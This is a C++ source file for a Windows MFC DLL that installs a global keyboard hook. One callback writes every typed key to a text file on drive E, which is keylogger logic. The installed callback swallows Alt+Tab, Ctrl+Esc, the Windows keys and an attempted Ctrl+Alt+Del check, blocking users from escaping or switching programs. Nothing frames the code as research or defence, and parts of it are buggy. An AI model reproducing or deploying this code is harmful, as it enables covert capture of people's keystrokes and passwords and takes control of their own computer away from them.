// hodll.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "hodll.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


#pragma data_seg(".SHARDAT")
static HHOOK hkb=NULL;
FILE *f1;
#pragma data_seg()

HINSTANCE hins;
//	Note!
//
//		If this DLL is dynamically linked against the MFC
//		DLLs, any functions exported from this DLL which
//		call into MFC must have the AFX_MANAGE_STATE macro
//		added at the very beginning of the function.
//
//		For example:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// normal function body here
//		}
//
//		It is very important that this macro appear in each
//		function, prior to any calls into MFC.  This means that
//		it must appear as the first statement within the 
//		function, even before any object variable declarations
//		as their constructors may generate calls into the MFC
//		DLL.
//
//		Please see MFC Technical Notes 33 and 58 for additional
//		details.
//

/////////////////////////////////////////////////////////////////////////////
// CHodllApp

BEGIN_MESSAGE_MAP(CHodllApp, CWinApp)
	//{{AFX_MSG_MAP(CHodllApp)
	// NOTE - the ClassWizard will add and remove mapping macros here.
	//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHodllApp construction


LRESULT __declspec(dllexport)__stdcall  CALLBACK KeyboardProc(
	int nCode, 
	WPARAM wParam, 
	LPARAM lParam)
{

	char ch;			
	if (((DWORD)lParam & 0x40000000) &&(HC_ACTION==nCode))
	{		
		if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100)) 
		{
			fopen_s(&f1,"e:\\report.txt","a+");
			if (wParam==VK_RETURN)
			{	ch='\n';
			fwrite(&ch,1,1,f1);
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);
				WORD w;
				UINT scan;
				scan=0;
				ToAscii(wParam,scan,ks,&w,0);
				ch =char(w); 
				fwrite(&ch,1,1,f1);
			}
			fclose(f1);
		}

	}	
	
	LRESULT RetVal=NULL;
	if(ch!='7')
		RetVal= CallNextHookEx( hkb, nCode, wParam, lParam );	
	else
	{	
		 CallNextHookEx(NULL, NULL, NULL,NULL);
	
		//   // Create a generic keyboard event structure
		//INPUT ip;
		//ip.type = INPUT_KEYBOARD;
		//ip.ki.wScan = 0;
		//ip.ki.time = 0;
		//ip.ki.dwExtraInfo = 0;
		// // Press the "V" key
  //      ip.ki.wVk = 'V';
  //      ip.ki.dwFlags = 0; // 0 for key press
  //      SendInput(1, &ip, sizeof(INPUT));

		

	}

	return  RetVal;

}


LRESULT CALLBACK KeyboardProc2(int nCode, WPARAM wp, LPARAM lp)
{
   KBDLLHOOKSTRUCT *pkh = (KBDLLHOOKSTRUCT *) lp;

   if (nCode==HC_ACTION) {
      BOOL bCtrlKeyDown =
         GetAsyncKeyState(VK_CONTROL)>>((sizeof(SHORT) * 8) - 1);

	    if( lp == MAKELONG(MOD_CONTROL | MOD_ALT, VK_DELETE))   //  (pkh->flags & LLKHF_ALTDOWN) && pkh->vkCode==VK_DELETE && bCtrlKeyDown )
		{
			return 1;
		}

		// Ctrl+Esc
      if ((pkh->vkCode==VK_ESCAPE && bCtrlKeyDown) || 
          // Alt+TAB
          (pkh->vkCode==VK_TAB && pkh->flags & LLKHF_ALTDOWN) ||   
          // Alt+Esc
          (pkh->vkCode==VK_ESCAPE && pkh->flags & LLKHF_ALTDOWN)|| 
		  // Start Menu
          (pkh->vkCode==VK_LWIN ||  pkh->vkCode==VK_RWIN)
		  // alt ctr del
		
		  ) 

	  { 
    
         return 1; // gobble it: go directly to jail, do not pass go
      }
   }
   return CallNextHookEx(hkb, nCode, wp, lp);
}



BOOL __declspec(dllexport)__stdcall installhook()
{
	fopen_s(&f1,"e:\\report.txt","w");
	fclose(f1);

	hkb=SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)KeyboardProc2,hins,0);

	return TRUE;
}
BOOL __declspec(dllexport)__stdcall  UnHook()
{

	BOOL unhooked = UnhookWindowsHookEx(hkb);
	// MessageBox(0,"exit","sasa",MB_OK);


	return unhooked;
} 


BOOL CHodllApp::InitInstance ()
{

	AFX_MANAGE_STATE(AfxGetStaticModuleState());
	hins=AfxGetInstanceHandle();
	return TRUE;

}
BOOL CHodllApp::ExitInstance ()
{

	return TRUE;
}

CHodllApp::CHodllApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CHodllApp object

CHodllApp theApp;
